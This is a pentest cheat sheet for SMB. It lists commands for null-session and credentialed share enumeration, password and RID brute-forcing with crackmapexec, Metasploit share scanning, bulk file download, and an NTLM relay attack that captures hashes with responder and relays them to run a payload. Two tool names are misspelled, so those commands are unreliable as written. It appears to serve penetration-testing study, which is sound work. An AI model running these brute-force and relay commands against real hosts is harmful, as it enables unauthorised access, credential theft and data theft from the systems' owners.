---
icon: database
description: Server Message Block
---

# SMB

## <mark style="color:purple;">Enumeration</mark>

{% tabs %}
{% tab title="smbclient" %}
{% code title="Without Credentials" %}
```
smbclient --no-pass //IP/<Share>
```
{% endcode %}

{% code title="Connect to share" %}
```bash
smbclient -N \\\\IP\Share
```
{% endcode %}

{% code title="List Resource list" %}
```bash
smbclient -L <IP>
```
{% endcode %}

{% code title="List Null session" %}
```bash
smbclient -N <IP>
```
{% endcode %}

{% code title="List Share" %}
```bash
smbclient //IP/<SHARE> -U <USER>
```
{% endcode %}
{% endtab %}

{% tab title="smbmap" %}
{% code title="Connect to Host" %}
```
smbmap -H <IP>
```
{% endcode %}

{% code title="Connect with credentials" %}
```bash
smbmap -H <IP> -d <dns> -u '<user>' -p '<pass>'
```
{% endcode %}

{% code title="List Share" %}
```
smbmap -H <IP> -r <SHARE>
```
{% endcode %}
{% endtab %}

{% tab title="crackmapexec" %}
{% code title="Connect to host" %}
```bash
crackmapexec smb <IP>
```
{% endcode %}

{% code title="List shares" %}
```bash
crackmapexec smb <IP> -u '' -p '' --shares
```
{% endcode %}

{% code title="Full Enumeration" %}
```bash
crackmapexec smb <IP> -u <username> -p <password> --allinfo
```
{% endcode %}

{% code title="Bruteforce" %}
```bash
cracmapexec smb <IP> -u usernames -p passwords
```
{% endcode %}

{% code title="Brutefoce RID" %}
```bash
crackmapexec smb <IP> -u <USER> -p <PASSWORD> --rid-brute
```
{% endcode %}

{% code title="Deep Enumeration" %}
```bash
crackmapexec smb <IP> -u usernames -p passwords --continue-on-success
```
{% endcode %}

{% code title="RMU (Remote Management User)" %}
```bash
crackmapexec winrm <IP> -u <USER> -p <PASSWORD>
```
{% endcode %}
{% endtab %}

{% tab title="impacket" %}
{% code title="Connect to server" %}
```bash
impacket-smbclient <IP>/user:password@address
```
{% endcode %}
{% endtab %}

{% tab title="smbget" %}
{% code title="Download file" %}
```bash
smbget -U <User> smb://IP/<SHARE_LOCATION> / --download
```
{% endcode %}
{% endtab %}

{% tab title="Metasploit" %}
{% code title="Select the module" %}
```bash
use auxiliary/scanner/smb/smb_enumshares
```
{% endcode %}

{% code title="Set target" %}
```bash
set RHOSTS <target_ip>
```
{% endcode %}

{% code title="Execute" %}
```bash
run
```
{% endcode %}
{% endtab %}
{% endtabs %}

***

## &#x20;<mark style="color:purple;">To download files type this sequence of commands:</mark>

{% stepper %}
{% step %}
### <mark style="color:orange;">`recurse`</mark>
{% endstep %}

{% step %}
### <mark style="color:orange;">`prompt`</mark>
{% endstep %}

{% step %}
### <mark style="color:orange;">`mget *`</mark>
{% endstep %}
{% endstepper %}

***

{% hint style="danger" %}
## <mark style="color:purple;">NTLM Relay Attacks</mark>

{% code title="Capture the Hash" %}
```bash
responder -I eth0 -dwv
```
{% endcode %}

{% code title="Relay the hash" %}
```bash
impacket-ntrlrelayx -tf target.txt -smb2support -c <payload>
```
{% endcode %}
{% endhint %}
